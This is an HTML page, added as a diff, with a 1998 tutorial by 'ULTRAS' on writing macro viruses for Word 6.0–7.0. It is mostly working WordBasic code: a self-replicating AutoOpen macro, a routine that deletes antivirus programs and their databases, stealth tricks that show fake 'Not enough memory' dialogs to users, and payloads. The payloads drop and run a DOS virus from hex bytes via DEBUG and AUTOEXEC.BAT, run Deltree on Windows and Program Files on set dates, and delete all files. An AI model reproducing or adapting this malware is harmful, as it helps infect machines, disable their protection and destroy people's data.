@@ -1,0 +1,321 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Macro Virus Tutorial for Word</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<P align="center"> <font color="#004080"><b><font size="+3">Macro Virus Tutorial 
+  for Word </font><br>
+  <font size="+1">by ULTRAS </font></b></font></P>
+<hr>
+<P><b>Index </b></P>
+<ol>
+  <li><a href="#1"> Introduction</a> </li>
+  <li><a href="#2">How to create virus under Word </a></li>
+  <li> <a href="#3">How to avoid AntiVirus </a></li>
+  <li> <a href="#4">How to do that my virus was stealth</a> </li>
+  <li> <a href="#5">Payload and Joke for your Macro Virii </a></li>
+</ol>
+<P> <b><a name="1"></a>Introduction </b></P>
+<P>
+ Welcome on Macro Virus Tutorial For Word surrender will be told problems
+ Word 6.0 - 7.0 macro viruses as a whole. At a last time macro viruses steels
+ very popular from for that that their easy write. A little will below be
+ described methods infect, joke, stealth, payload and the another.
+</P>
+<P> <b><a name="2"></a>How to create virus under Word </b></P>
+<P>
+ This question appears beside all who wants to write its virus certainly if
+ you want this to do quickly use then "UCK" if want to do themselves read all
+ that wakes written below.
+</P><P>
+ Begin the most light name to auto functions word:
+</P>
+<blockquote>
+  <PRE>
+* AutoOpen:  This macros activates when opening an existing document
+* AutoClose: This macros activates when closing a document
+* AutoExec:  This macros activates when loading a textual mode
+* AutoNew:   This macros activates when creating a new document
+* AutoExit:  This macros activates when exiting a textual mode
+</PRE>
+</blockquote>
+<P>
+ Chalice and better use macros AutoOpen. After you have chosen macros
+ under infecting create its in word and insert necessary line in it:
+</P>
+<blockquote>
+  <PRE>
+ Sub MAIN                            ' Begin chosen macros
+ On Error Resume Next                ' To Execute following
+ AO$ = FileName$() + ":AutoOpen"     ' AO = AutoOpen + FileName
+ AC$ = "AutoClose"                   ' AC = AutoClose
+ MacroCopy AC$, AO$                  ' Copy macros AutoOpen - AutoClose
+ FileSaveAs .Format = 1              ' Saves Global macros
+ MacroCopy AO$, AC$                  ' Copy macros AutoOpen - AutoClose
+ FileSave                            ' To Save in active document or pattern
+ End Sub                             ' Finish to write macros
+</PRE>
+</blockquote>
+<P>
+ Small virus beside you already be, Needed that nor be else shorter see below.
+ Your virus to be necessary else at least payload that it was distinguished
+ from the others.
+</P>
+<P> <b><a name="3"></a>How to avoid AntiVirus </b></P>
+<P>
+ Exists several ways of pass-by an AntiVirus I show the most light from them.
+ Therefor that this way worked is necessary put (deliver) in macros infects
+ for instance "AutoOpen" line:
+</P>
+<blockquote>
+  <PRE>
+ Call KillAV     ' KillAV name not obligatory you may name how want
+</PRE>
+</blockquote>
+<P>
+ Hereon create macros KillAV and insert necessary lines.
+</P>
+<blockquote>
+  <PRE>
+ Sub Main()                                            ' Begin chosen macros
+ On Error Resume Next                                  ' To Execute following
+ Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"     ' Delete all files in AVP
+ Kill "C:\Program Files\Command Software\F-PROT95\*.*" ' Delete all files in F-PROT
+ Kill "C:\Program Files\McAfee\VirusScan\*.*"          ' Delete all files in McAfee
+ Kill "C:\Program Files\Norton AntiVirus\*.*"          ' Delete all files in NAV
+ Kill "C:\Toolkit\FindVirus\*.*"                       ' Delete all files in Dr.Solomon
+ Kill "C:\PC-Cillin 95\*.*"                            ' Delete all files in PC-Cillin 95
+ Kill "C:\PC-Cillin 97\*.*"                            ' Delete all files in PC-Cillin 97
+ Kill "C:\Tbavw95\*.*"                                 ' Delete all files in Tbav
+ End Sub                                               ' Finish with AntiVirus destroying
+</PRE>
+</blockquote>
+<P>
+ You may delete not directory but for instance databases AntiVirus.
+ For instance AVP if delete its base that it will begin to swear and not will
+ started this to do much simply:
+</P>
+<blockquote>
+  <PRE>
+ Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
+</PRE>
+</blockquote>
+<P>
+ And such belongings possible to do with any AntiVirus only is necessary find
+ base or main file. Certainly you may change destroying other AntiVirus,
+ I simply has taken the first seen AntiVirus.
+</P>
+<P> <b><a name="4"></a>How to do that my virus was stealth </b></P>
+<P>
+ That do a virus stealth no need to write sound codes as asm in macro virus
+ this easier in this you convince themselves having read this will become.
+ Stealth directions in macro virus possible divide in several methods.
+</P>
+<blockquote>
+  <PRE>
+ <b>1.Method - This simple method you simply create macros ToolsMacro, Filetemplates,
+ --------   ToolsCustomize and write in it following:
+
+
+</b> Sub Main()
+ 'Rioters Group  ' Commenting text
+ beep            ' This if contamination document to press ToolsMacros wakes
+ End Sub         ' small sound
+
+ 
+ <b>2.Method - This method you simply create macros ToolsMacro, Filetemplates,
+ --------   ToolsCustomize and write in it following:
+
+
+</b> Sub Main()
+ beep             'small sound
+ MsgBox("Not enough memory to perform this operation"),("Microsoft Word"), 48
+ 'In this message User will exactly believe
+ End Sub
+
+ <b>3.Method - This method name Emulation it from MoonRaider virus
+</b> --------
+
+ Sub MAIN
+ Dim ComboBox1$(0)
+ ComboBox1$(0) = ""
+ Dim ListBox1$(0)
+ ListBox1$(0) = ""
+ Dim DropListBox2$(0)
+ DropListBox2$(0) = "Normal.dot"
+ Begin Dialog UserDialog 442, 320, "Macro"
+        PushButton 290, 14, 141, 21, "Rec&ord...", .Definierbar2
+        CancelButton 290, 43, 141, 21
+        PushButton 290, 72, 141, 21, "&Run", .Definierbar3
+        PushButton 290, 102, 141, 21, "&Edit", .Definierbar4
+        PushButton 290, 130, 141, 21, "&Delete", .Definierbar5
+        PushButton 290, 166, 141, 21, "Or&ganizer...", .Definierbar6
+        ComboBox 7, 23, 269, 194, ComboBox1$(), .ComboBox1
+        Text 6, 223, 93, 13, "Macros &Available In:", .Text1
+        Text 7, 259, 109, 13, "Descr&iption:", .Text2
+        Text 7, 6, 93, 13, "Macros:", .Text3
+        ListBox 7, 276, 425, 38, ListBox1$(), .ListBox1
+        DropListBox 6, 238, 425, 19, DropListBox2$(), .ListBox2
+ End Dialog
+
+ Redim dlg As UserDialog
+ x = Dialog(dlg)
+ Select Case x
+ Case 0
+ Cancel
+ Case 1
+ MsgBox "Not enough memory", "WordBasic Err = 7"
+ Case 2
+ MsgBox "Not enough memory", "WordBasic Err = 7"
+ Case 3
+ MsgBox "Not enough memory", "WordBasic Err = 7"
+ Case 4
+ MsgBox "Not enough memory", "WordBasic Err = 7"
+ Case 5
+ MsgBox "Not enough memory", "WordBasic Err = 7"
+ End Select
+ End Sub
+
+ <b>4.Method - I think that this stealth method the most best it does not occupy
+ --------  much place in the virus and suitable. If user will want to look if
+           beside it macros virus it will open a function ToolsMacro, virus
+           when performing this functions creates a new document and opens there
+           this function. The User having looked that there no macros rejoices
+           but we in this time infect the documents.
+</b>
+ Sub Main()
+ On Error Goto Stealth
+ ScreenUpdating
+ FileNew
+ Dim dlg As ToolsMacro
+ GetCurValues dlg
+ Dialog dlg
+ FileClose 2
+ ScreenUpdating
+ ToolsMacro dlg
+ Stealth:
+ End Sub
+</PRE>
+</blockquote>
+<P>
+ Well here is and has shown I 4 methods stealth viruses but you themselves
+ decide what you better use.
+</P>
+<P> <b><a name="5"></a>Payload and Joke for your Macro Virii </b></P>
+<P>
+ I show only several payload but rest you see if find my constructor under
+ name "ULTRAS Construction Kit or UCK" In him you will find much useful
+ belongings.
+</P>
+<PRE>
+<b> 1.Method - Drop Virus. In case in point this virus ZOO
+</b> --------
+
+ 
+ G = Int(Rnd() * 7) + 1                ' Generate Weekday
+ If Weekday(Now()) = G Then            ' Substitute here
+ Open "C:\WINDOWS\COMMAND\DEBUG.EXE" For Input As #1 ' Use DEBUG utility
+ Close #1
+ Open "C:\WINDOWS\ZOO.SCR" For Output As #1 ' Create ZOO file.SCR and prescribe there virus
+ Print #1, "N ZOO.COM"                  ' But here is and virus itself
+ Print #1, "E 0100 B4 4E B9 06 00 BE 1E 02 E8 A4 00 B9 20 00 CD 21"
+ Print #1, "E 0110 73 03 E8 58 01 B9 06 00 EB 06 90 00 00 04 00 00"
+ Print #1, "E 0120 BE 1E 02 E8 89 00 E8 AA 00 81 3E 9A 00 7F 01 76"
+ Print #1, "E 0130 5E BA 9E 00 E8 96 00 72 56 93 E8 57 00 BA 00 04"
+ Print #1, "E 0140 E8 82 00 E8 AD 00 81 3E 00 F0 4E 45 75 3B BA 00"
+ Print #1, "E 0150 02 E8 71 00 E8 9C 00 81 3E 00 F0 F8 53 75 2A BA"
+ Print #1, "E 0160 20 00 E8 60 00 E8 8B 00 81 3E 00 F0 B4 4E 74 19"
+ Print #1, "E 0170 33 D2 E8 50 00 B4 40 BA FE 01 B9 20 00 CD 21 B4"
+ Print #1, "E 0180 40 B9 7F 01 BA 00 01 CD 21 E8 54 00 E8 5F 00 B4"
+ Print #1, "E 0190 4F E9 6E FF 53 06 57 B8 20 12 50 CD 2F 26 8A 1D"
+ Print #1, "E 01A0 58 2C 0A CD 2F 26 C7 45 02 02 00 5F 07 5B C3 50"
+ Print #1, "E 01B0 E4 42 8A E0 E4 42 3A C4 75 01 C3 58 56 80 34 DB"
+ Print #1, "E 01C0 46 E2 FA 5A C3 33 C9 B8 00 42 CD 21 C3 B8 00 3D"
+ Print #1, "E 01D0 CD 21 C3 A1 96 00 A3 FC EF A1 98 00 A3 FE EF C3"
+ Print #1, "E 01E0 B8 01 57 8B 0E FC EF 8B 16 FE EF CD 21 C3 B4 3E"
+ Print #1, "E 01F0 CD 21 C3 B9 02 00 B4 3F BA 00 F0 CD 21 C3 4D 5A"
+ Print #1, "E 0200 9F 01 01 00 00 00 02 00 00 00 FF FF F0 FF 00 00"
+ Print #1, "E 0210 00 00 00 01 F0 FF 1C 00 00 00 00 00 00 00 F1 F5"
+ Print #1, "E 0220 BE A3 BE DB 8F B3 B2 A8 FB AB A9 B4 BC A9 BA B6"
+ Print #1, "E 0230 FB A9 BE AA AE B2 A9 BE A8 FB 96 B2 B8 A9 B4 A8"
+ Print #1, "E 0240 B4 BD AF FB 8C B2 B5 BF B4 AC A8 F5 D6 D1 FF F3"
+ Print #1, "E 0250 B8 F2 FB 9F 95 BA A1 B2 17 20 FB 28 32 3F 3E 37"
+ Print #1, "E 0260 FB 33 3C FB 3C 35 35 34 3B 2B 31 3B FA B9 2B 00"
+ Print #1, "E 0270 BE 24 02 E8 39 FF B4 09 CD 21 B8 01 4C CD 21"
+ Print #1, "RCX"
+ Print #1, "017F"
+ Print #1, "W"
+ Print #1, "Q"
+ Close #1
+ Open "C:\ZOO.BAT" For Output As #1 ' Create bat file to compile virus
+ Print #1, "@ECHO OFF"
+ Print #1, "DEBUG.EXE &lt; C:\WINDOWS\ZOO.SCR &gt; NUL" ' Insert parameters
+ Close #1
+ ChDir "C:\WINDOWS\"
+ Shell "ZOO.BAT", 0   ' Start compiling
+ Open "C:\AUTOEXEC.BAT" For Append As #1 ' Prescribe that virus infected when 
+ Print #1, "@C:\WINDOWS\ZOO.COM"         ' loading a computer
+
+ Close #1
+ Kill "C:\WINDOWS\ZOO.SCR"               ' Destroy its traces
+ MsgBox "GoBLiN III by ULTRAS" + Chr$(13) + \
+       "Thank you Dirty Nazi [Stealth group WorldWide]" + Chr$(13)  + \
+       "for such beautiful virus." + Chr$(13)  + \
+       "Written by ULTRAS", "ULTRAS...", 16
+
+<b> 2.Method - Destroying the files
+</b> --------
+
+ If Day(Now()) = 9 Then                     ' 9 numbers of each month
+ MsgBox("Windoze Must die"),("ULTRAS"), 16       ' we show messages
+ Shell("Deltree  /y C:\Windows")            ' and destroy file "WINDOWS"
+ End If
+
+ If Day(Now()) = 18 Then                    ' 18 numbers of each month
+ MsgBox("haHaha....."),("ULTRAS"), 48       ' we show messages
+ Shell("Deltree  /y C:\Progra~1")           ' and destroy file "Program Files"
+ End If
+
+ If you dislike what I day has putted (deliver) you can to change its on any
+ the another or put (deliver) other for instance:
+
+ If Month(Now()) = ? Then    ' where ? = any month
+ If Day(Now()) = ? Then      ' where ? = any day
+ If Year(Now()) = ? Then     ' where ? = any Year
+ If Weekday(Now()) = ? Then  ' where ? = any Weekday
+ If Hour(Now()) = ? Then     ' where ? = any Hour
+ If Minute(Now()) = ? Then() ' where ? = any Minute
+
+<b> 3.Method - This joke from ATOM virus
+</b> <b>--------
+
+ If day 12th of december it will delete  all files in contamination directory *.*.
+</b>
+ Sub MAIN
+ On Error Goto KillError
+ If Day(Now()) = 13 And Month(Now() = 12) Then ' Check day and month
+        Kill "*.*"                             ' Delete files
+ End If
+ KillError:
+ End Sub
+
+<b> 4.Method - This joke from Wazzu virus
+ --------
+ Said part macro generates a free number, and if number more low, then 0.25 it
+ will install Wazzu word in begin document.
+</b>
+ If Rnd() &lt; 0.25 Then
+        RndWord
+        Insert "wazzu "
+        StartOfDocument
+ End If
+</PRE>
+<P>
+ Exists much much payload and nearly in each virus be its joke or payload
+ their simply unrealistic to tell.
+</P>
+<P> ULTRAS 1998 </P>
+<hr>
+</BODY>
+</HTML>
